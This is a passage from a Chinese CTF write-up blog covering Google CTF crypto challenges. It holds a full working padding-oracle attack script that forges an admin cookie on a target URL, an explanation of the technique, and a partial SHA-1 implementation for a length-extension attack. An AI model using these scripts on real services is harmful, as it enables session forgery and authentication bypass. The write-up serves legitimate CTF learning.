class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> <span class="type">OptionParser</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">class <span class="type">POAttack</span>():</span><br><span class="line">    <span class="string">"""</span><br><span class="line">    以GGCTF的一题为例写的Padding Oracle Attack</span><br><span class="line">    By Hcamael</span><br><span class="line">    """</span></span><br><span class="line">    def __init__(self, options):</span><br><span class="line">        self.url = options.url</span><br><span class="line">        self.length = options.length</span><br><span class="line">        cookie = options.cookie.split(<span class="string">"="</span>)</span><br><span class="line">        assert len(cookie) == <span class="number">2</span></span><br><span class="line">        self.c_name = cookie[<span class="number">0</span>]</span><br><span class="line">        c = cookie[<span class="number">1</span>].decode('hex')</span><br><span class="line">        <span class="keyword">if</span> len(c) % self.length != <span class="number">0</span> <span class="keyword">or</span> len(c) == self.length:</span><br><span class="line">            <span class="keyword">raise</span> <span class="string">"cookie error!"</span></span><br><span class="line">        self.sign = c[-self.length:].encode('hex')</span><br><span class="line">        self.<span class="literal">result</span> = self.sign</span><br><span class="line">        self.unenc = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> options.plain:</span><br><span class="line">            self.plain = options.plain</span><br><span class="line">            self.pad_plain = (self.length - len(self.plain) % self.length)</span><br><span class="line">            self.pad_iv = c[-self.length*<span class="number">2</span>: -self.length]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.pad_plain = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    def attack(self, msg):</span><br><span class="line">        self.a_str = msg</span><br><span class="line">        pad = (self.length - len(self.a_str) % self.length)</span><br><span class="line">        self.a_str += chr(pad) * pad</span><br><span class="line">        assert len(self.a_str) % self.length == <span class="number">0</span></span><br><span class="line">        self.l_str = list(struct.unpack(<span class="string">"16s"</span>*(len(self.a_str)/self.length), self.a_str))</span><br><span class="line"></span><br><span class="line">        self.iv = <span class="string">"\x00"</span> * self.length</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(len(self.l_str)):</span><br><span class="line">            <span class="literal">result</span> = self.padding()</span><br><span class="line">            self.unenc = <span class="literal">result</span> + self.unenc</span><br><span class="line">            assert len(<span class="literal">result</span>) == len(self.l_str[-x-<span class="number">1</span>]) == self.length</span><br><span class="line">            tmp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(len(<span class="literal">result</span>)):</span><br><span class="line">                tmp += chr(ord(<span class="literal">result</span>[y])^ord(self.l_str[-x-<span class="number">1</span>][y]))</span><br><span class="line">            self.sign = tmp.encode('hex')</span><br><span class="line">            self.<span class="literal">result</span> = self.sign + self.<span class="literal">result</span></span><br><span class="line">        <span class="keyword">return</span> (self.<span class="literal">result</span>, self.unenc.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">    def padding(self):</span><br><span class="line">        tmp_iv = list(self.iv)</span><br><span class="line">        <span class="literal">result</span> = list(<span class="string">"\x00"</span> * self.length)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.pad_plain:</span><br><span class="line">            n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = self.pad_plain</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(n):</span><br><span class="line">                <span class="literal">result</span>[-i-<span class="number">1</span>] = chr(n ^ ord(self.pad_iv[-i-<span class="number">1</span>]))</span><br><span class="line">            self.pad_plain = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(n, self.length):</span><br><span class="line">            <span class="keyword">if</span> n != x:</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">"Padding Error!"</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(x):</span><br><span class="line">                tmp_iv[-i-<span class="number">1</span>] = chr((x+<span class="number">1</span>) ^ ord(<span class="literal">result</span>[-i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                tmp_iv[-x-<span class="number">1</span>] = chr(y)</span><br><span class="line">                tmp = <span class="string">""</span>.join(tmp_iv).encode('hex')</span><br><span class="line">                cookie = &#123;self.c_name: tmp + self.sign&#125;</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    req = requests.get(self.url, cookies=cookie, verify=<span class="type">False</span>, allow_redirects=<span class="type">False</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print <span class="literal">result</span></span><br><span class="line">                    print self.<span class="literal">result</span></span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">if</span> req.status_code != <span class="number">500</span>:</span><br><span class="line">                    <span class="literal">result</span>[-x-<span class="number">1</span>] = chr(y^(x+<span class="number">1</span>))</span><br><span class="line">                    n += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(<span class="literal">result</span>)</span><br><span class="line"></span><br><span class="line">def add_parse():</span><br><span class="line">    parser = <span class="type">OptionParser</span>()</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--url"</span>,</span><br><span class="line">        dest=<span class="string">"url"</span>,</span><br><span class="line">        help=<span class="string">"Please input the url"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--l"</span>,</span><br><span class="line">        dest=<span class="string">"length"</span>,</span><br><span class="line">        <span class="keyword">type</span>=<span class="string">"int"</span>,</span><br><span class="line">        help=<span class="string">"Please input the iv's bytes length"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--cookie"</span>,</span><br><span class="line">        dest=<span class="string">"cookie"</span>,</span><br><span class="line">        help=<span class="string">"Please input the url's cookie"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--s"</span>,</span><br><span class="line">        dest=<span class="string">"a_str"</span>,</span><br><span class="line">        help=<span class="string">"Please input you want to construct a string"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--p"</span>,</span><br><span class="line">        dest=<span class="string">"plain"</span>,</span><br><span class="line">        help=<span class="string">"Please input if you know cookie's pliantext"</span>)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = add_parse()</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (options.url <span class="keyword">and</span> options.length <span class="keyword">and</span> options.cookie <span class="keyword">and</span> options.a_str):</span><br><span class="line">        parser.parse_args(['cbc-padding-oracle-attack.py', '-h'])</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cbca = <span class="type">POAttack</span>(options)</span><br><span class="line">    r, s = cbca.attack(options.a_str)</span><br><span class="line">    print <span class="string">"+-------------------+"</span></span><br><span class="line">    print <span class="string">"|       Result     |"</span></span><br><span class="line">    print <span class="string">"+--------------------+"</span></span><br><span class="line">    print <span class="string">"Your want string's cookie: "</span> + r</span><br><span class="line">    print <span class="string">"AES decrypt result: "</span> + s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == '__main__':</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>要完成Padding Oracle Attack, 首先需要知道IV的长度(—l int型长度)，还需要能对此进行攻击的服务(—url)，还有就是对服务传递的参数(—cookie)，由于该脚本是我对照了GGCTF的这题写的，所以是<code>--url</code>和<code>--cookie</code>参数，然后还有你想构造的字符串(—s)，最后一个<code>--p</code>参数为可选参数，可以加快Attack的速度.</p>
<h2 id="Padding_Oracle_Attack_原理">Padding Oracle Attack 原理</h2><p>看GGCTF中这题对解密后的密文第一个判断<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">pad</span> &gt; CookieCutter.KEY_SIZE:</span><br><span class="line">    raise ValueError, <span class="string">"pad error - pad is %d"</span> % (<span class="keyword">pad</span>)</span><br><span class="line"></span><br><span class="line">expected = chr(<span class="keyword">pad</span>) * <span class="keyword">pad</span></span><br><span class="line">piece = plaintext[-<span class="keyword">pad</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> piece <span class="comment">!= expected:</span></span><br><span class="line">    raise ValueError, <span class="string">"padding is corrupted"</span></span><br></pre></td></tr></table></figure></p>
<p>然后再看看加密时，对明文Padding的代码<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="list">(<span class="number">16</span> - <span class="list">(<span class="keyword">len</span><span class="list">(<span class="keyword">s</span>)</span> % <span class="number">16</span>)</span>)</span></span><br><span class="line">s += chr<span class="list">(<span class="keyword">pad</span>)</span> * pad</span><br></pre></td></tr></table></figure></p>
<p>我们可以得到<code>0 &lt; pad &lt;= 16</code></p>
<p>pad用来把明文s补全到16的倍数，补全pad个chr(pad)字符</p>
<p>我们利用的就是解密时，对padding的判断，服务器是否返回500来对解密后的信息来进行判断</p>
<p>比如我们随便找一串密文<code>4da82e7d080d689d6fed5942671dde6f</code></p>
<p>初始化IV为<code>00000000000000000000000000000000</code></p>
<p>CBC模式流程为：c=<code>4da82e7d080d689d6fed5942671dde6f</code> -&gt; 解密 -&gt; de=<code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> -&gt; xor IV -&gt; M[16]</p>
<p>先遍历IV的最后一位，从00遍历道ff，如果<code>M[15] != 0x01</code>时，服务器则会返回500，(不过也会有例外，比如<code>M[14]==M[15]==0x02</code>，类推有15种这样的特殊情况，不过出现的概率太小，所以默认排除这类情况)</p>
<p>假如当<code>IV[15] = \xae</code>时，服务器返回200或302(视具体情况而定)时，我们可以得到<code>de[15] xor IV[15] = \x01</code> -&gt; <code>de[15] = \x01 xor \xae</code><br>这样解密后的de的最后一位我们就算出来了</p>
<p>接下来就是de的倒数第二位，也就是<code>M[14]==M[15]==\x02</code>，因为我们知道里<code>de[15]</code>所以我们可以求得<code>IV[15] = de[15] xor \x02</code>，这时IV[15]是确定的值，所以我们只要遍历IV[14]，假如当<code>IV[14] = \x63</code>时，服务器返回非500，我们可以求得<code>de[14] = \x63 xor \x02</code></p>
<p>以此类推我们最后可以求出de的全16位，按这题，我们需要构造的字符串是<code>{&quot;username&quot;: &quot;admin&quot;}+\x0b * 11</code>，不过我们需要从最后算起，所以就是用<code>min&quot;}+\x0b * 11 xor de</code>，这样可以求出IV，然后把这IV当做<code>{&quot;username&quot;: &quot;ad</code>的c，然后再跑出最终的IV</p>
<p>如果上面的代码能看懂，也就能理解Padding Oracle Attack了</p>
<h1 id="Wolf_Spider">Wolf Spider</h1><blockquote>
<p><a href="https://wolf-spider.ctfcompetition.com/" target="_blank" rel="external">https://wolf-spider.ctfcompetition.com/</a></p>
</blockquote>
<p>和上面那题是一个系列的，也就是在上一题的基础上加上了消息认证，从而多了一步Length Extension Attack</p>
<p>在《白帽子讲WEB安全》上是以md5为例进行的讲解，本题用的是sha1，所以我还去研究了下sha1的流程，自己写了个python实现的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROTL32</span><span class="params">(x, r)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = (x &lt;&lt; r) ^ (x &gt;&gt; (<span class="number">32</span> - r))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> type(x)</span><br><span class="line">        <span class="keyword">print</span> type(r)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.length_ = <span class="number">0</span></span><br><span class="line">        self.unprocessed_ = <span class="number">0</span></span><br><span class="line">        self.hash_ = [</span><br><span class="line">            <span class="number">0x67452301</span>,</span><br><span class="line">            <span class="number">0xefcdab89</span>,</span><br><span class="line">            <span class="number">0x98badcfe</span>,</span><br><span class="line">            <span class="number">0x10325476</span>,</span><br><span class="line">            <span class="number">0xc3d2e1f0</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sha1_process</span><span class="params">(self)</span>:</span></span><br><span class="line">        wblock = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">80</span>):</span><br><span class="line">            wblock.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            wblock[x] = self.block[x]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>, <span class="number">80</span>):</span><br><span class="line">            wblock[x] = ROTL32(wblock[x - <span class="number">3</span>] ^ wblock[x - <span class="number">8</span>] ^ wblock[x - <span class="number">14</span>] ^ wblock[x - <span class="number">16</span>], <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        a = self.hash_[<span class="number">0</span>]</span><br><span class="line">        b = self.hash_[<span class="number">1</span>]</span><br><span class="line">        c = self.hash_[<span class="number">2</span>]</span><br><span class="line">        d = self.hash_[<span class="number">3</span>]</span><br><span class="line">        e = self.hash_[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (((c ^ d) &amp; b) ^ d) + e + wblock[x] + <span class="number">0x5A827999</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">20</span>, <span class="number">40</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (b ^ c ^ d) + e + wblock[x] + <span class="number">0x6ED9EBA1</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">40</span>, <span class="number">60</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + ((b &amp; c) | (b &amp; d) | (c &amp; d)) + e + wblock[x] + <span class="number">0x8F1BBCDC</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">60</span>, <span class="number">80</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (b ^ c ^ d) + e + wblock[x] + <span class="number">0xCA62C1D6</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        self.hash_[<span class="number">0</span>] += a</span><br><span class="line">        self.hash_[<span class="number">1</span>] += b</span><br><span class="line">        self.hash_[<span class="number">2</span>] += c</span><br><span class="line">        self.hash_[<span class="number">3</span>] += d</span><br><span class="line">        self.hash_[<span class="number">4</span>] += e</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            self.hash_[x] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">str_to_block</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.block = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(x, x + <span class="number">64</span>, <span class="number">4</span>):</span><br><span class="line">            tmp = self.msg[i: i + <span class="number">4</span>]</span><br><span class="line">            tmp = int(tmp.encode(<span class="string">'hex'</span>) <span class="keyword">or</span> <span class="string">'0'</span>, <span class="number">16</span>)</span><br><span class="line">            self.block.append(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(self, msg, length)</span>:</span></span><br><span class="line">        self.msg = msg</span><br><span class="line">        self.length_ = length</span><br><span class="line">        self.msg += (<span class="number">64</span> - length % <span class="number">64</span>) * <span class="string">'\x00'</span></span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> length &gt;= <span class="number">64</span>:</span><br><span class="line">            self.str_to_block(x)</span><br><span class="line">            self.sha1_process()</span><br><span class="line">            x += <span class="number">64</span></span><br><span class="line">            length -= <span class="number">64</span></span><br><span class="line">        self.str_to_block(x)</span><br><span class="line">        self.unprocessed_ = length</span><br><span class="line">        self.block = self.padding()</span><br><span class="line">        self.sha1_process()</span><br><span class="line">        <span class="keyword">return</span> self.final()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(self)</span>:</span></span><br><span class="line">        message = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            message.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            tmp = struct.pack(<span class="string">"I"</span>, self.block[x])</span><br><span class="line">            message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        index = (self.length_ &amp; <span class="number">63</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        shift = (self.length_ &amp; <span class="number">3</span>) * <span class="number">8</span></span><br><span class="line">        message[index] &amp;= ~(<span class="number">0xFFFFFFFF</span> &lt;&lt; shift)</span><br><span class="line">        message[index] ^= <span class="number">0x80</span> &lt;&lt; shift</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">while</span> index &lt; <span class="number">16</span>:</span><br><span class="line">                message[index] = <span class="number">0</span></span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 进行大小端转换</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">                tmp = struct.pack(<span class="string">"I"</span>, message[x])</span><br><span class="line">                message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">            self.block = message</span><br><span class="line">            self.sha1_process()</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> index &lt; <span class="number">14</span>:</span><br><span class="line">            message[index] = <span class="number">0</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data_len = self.length_ &lt;&lt; <span class="number">3</span></span><br><span class="line">        data_len = int(struct.pack(<span class="string">"L"</span>, data_len).encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">        message[<span class="number">14</span>] = data_len &amp; <span class="number">0x00000000FFFFFFFF</span></span><br><span class="line">        message[<span class="number">15</span>] = (data_len &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">        <span class="comment"># 进行大小端转换</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            tmp = struct.pack(<span class="string">"I"</span>, message[x])</span><br><span class="line">            message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">final</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            self.hash_[x] = ctypes.c_uint32(self.hash_[x])</span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.hash_:</span><br><span class="line">            result += <span class="string">"&#123;:0&gt;8&#125;"</span>.format(hex(x.value)[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    test_str = [</span><br><span class="line">        <span class="string">""</span>,</span><br><span class="line">        <span class="string">"a"</span>,</span><br><span class="line">        <span class="string">"abc"</span>,</span><br><span class="line">        <span class="string">"message digest"</span>,</span><br><span class="line">        <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>,</span><br><span class="line">        <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>,</span><br><span class="line">        <span class="string">"12345678901234567890123456789012345678901234567890123456789012345678901234567890"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># for x in test_str:</span></span><br><span class="line">    <span class="comment">#   s = SHA1()</span></span><br><span class="line">    <span class="comment">#   print s.sha1(x, len(x))</span></span><br><span class="line">    <span class="comment">#   print hashlib.sha1(x).hexdigest()</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    已知 sha1("abcdefghijklmnopqrstuvwxyz")</span><br><span class="line">    可求 sha1("abcdefghijklmnopqrstuvwxyz\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a" + "test")</span><br><span class="line">    '''</span></span><br><span class="line">    s1 = hashlib.sha1(<span class="string">"abcdefghijklmnopqrstuvwxyz"</span>).hexdigest()</span><br><span class="line">    <span class="comment">#s = SHA1()</span></span><br><span class="line">    x1 = <span class="string">"abcdefghijklmnopqrstuvwxyz\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0"</span> + <span class="string">"test"</span></span><br><span class="line">    x2 = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">    <span class="comment">#print s.sha1(x1, len(x1))</span></span><br><span class="line">    <span class="comment"># s = SHA1()</span></span><br><span class="line">    <span class="comment">#s.sha1(x2, len(x2))</span></span><br><span class="line">    check_s2 = hashlib.sha1(x1).hexdigest()</span><br><span class="line">    <span class="comment">#print s1</span></span><br><span class="line">    <span class="keyword">print</span> check_s2</span><br><span class="line">    s = SHA1()</span><br><span class="line">    <span 